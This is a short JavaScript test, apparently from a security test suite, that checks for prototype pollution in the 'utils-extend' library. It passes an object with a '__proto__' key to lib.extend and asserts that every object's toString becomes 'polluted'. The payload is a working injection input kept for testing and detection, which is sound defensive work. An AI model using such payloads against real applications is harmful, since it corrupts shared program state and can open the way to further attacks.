test("Prototype pollution in utils-extend", () => {
  const lib = require('utils-extend');

  let payload = { ["__proto__"]: { "toString": "polluted" } };

  expect({}.toString).toBe({}.toString);

  lib.extend({}, payload);

  expect({}.toString).toBe("polluted");
})
